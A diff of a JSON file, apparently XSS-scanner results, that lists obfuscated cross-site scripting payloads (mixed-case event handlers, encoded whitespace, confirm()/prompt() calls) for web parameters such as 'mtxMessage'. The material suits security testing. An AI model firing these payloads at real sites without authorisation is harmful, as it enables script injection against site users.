@@ -55,93 +55,24 @@
   {
     "payloads": [
       {
-        "payload": "\"><hTml/+/oNmoUSEOvER%0d=%0dconfirm()>"
+        "payload": "<D3v%0aOnpoinTErEnTER%0a=%0aconfirm()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><d3V%09ONMoUSEOVer+=+confirm()%0dx>v3dm0s"
+        "payload": "<A%0aoNMoUseOVEr+=+(confirm)()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><HTML%0aONmoUseoVER%0d=%0da=prompt,a()>"
+        "payload": "<A%0dONMOusEoveR+=+a=prompt,a()>v3dm0s"
       },
       {
-        "payload": "\"><dEtAIls/+/ONtOgGle%0d=%0d(prompt)``//"
+        "payload": "<hTml%0aoNmOUSEovEr%09=%09(confirm)()%0dx//"
       },
       {
-        "payload": "\"><d3v%0dONMoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s"
+        "payload": "<D3v/+/OnPOiNTErenTeR%09=%09confirm()>v3dm0s"
       },
       {
-        "payload": "\"><DETaIls%0dOntogGLe+=+a=prompt,a()%0dx>"
+        "payload": "<A%0dONpointeREnter%0a=%0aconfirm()>v3dm0s"
       }
     ],
-    "parameter": "p06"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "'><A/+/onMOUseOVEr+=+a=prompt,a()>v3dm0s"
-      },
-      {
-        "payload": "'><a%0aOnMoUseOVEr%0a=%0a(confirm)()>v3dm0s"
-      },
-      {
-        "payload": "'><HTmL%0aONmOuseovER+=+(prompt)``%0dx>"
-      },
-      {
-        "payload": "'><HtmL/+/oNPOInTERenTER%0d=%0d(prompt)``//"
-      },
-      {
-        "payload": "'><d3V/+/ONMousEOVER+=+[8].find(confirm)%0dx>v3dm0s"
-      },
-      {
-        "payload": "'><DETAils%09OnpoIntEREnTeR%09=%09[8].find(confirm)//"
-      }
-    ],
-    "parameter": "p07"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "\"%09AUtoFoCuS%09ONFOCUs=\"(confirm)()"
-      },
-      {
-        "payload": "\"%09autofoCus%09oNFoCuS=\"confirm()"
-      },
-      {
-        "payload": "\"%0aaUToFOCus%0aONFOCus=\"[8].find(confirm)"
-      },
-      {
-        "payload": "\"/+/autOFOCus/+/onfoCus=\"[8].find(confirm)"
-      },
-      {
-        "payload": "\"%09AUtofOCuS%09onFOCus=\"a=prompt,a()"
-      },
-      {
-        "payload": "\"%0dAuTOfocus%0doNfOcUs=\"a=prompt,a()"
-      }
-    ],
-    "parameter": "p08"
-  },
-  {
-    "payloads": [
-      {
-        "payload": "'%0aaUTOFocus%0aONfocus='confirm()"
-      },
-      {
-        "payload": "'%0aAuTOFOcus%0aoNfOcUs='confirm()"
-      },
-      {
-        "payload": "'/+/autOFocuS/+/ONfocUs='(confirm)()"
-      },
-      {
-        "payload": "'/+/AutOFOcus/+/onFOcus='confirm()"
-      },
-      {
-        "payload": "'%0aAuTOFOcus%0aonfocus='(prompt)``"
-      },
-      {
-        "payload": "'/+/aUToFocUs/+/oNfocuS='[8].find(confirm)"
-      }
-    ],
-    "parameter": "p09"
+    "parameter": "mtxMessage"
   }
 ]
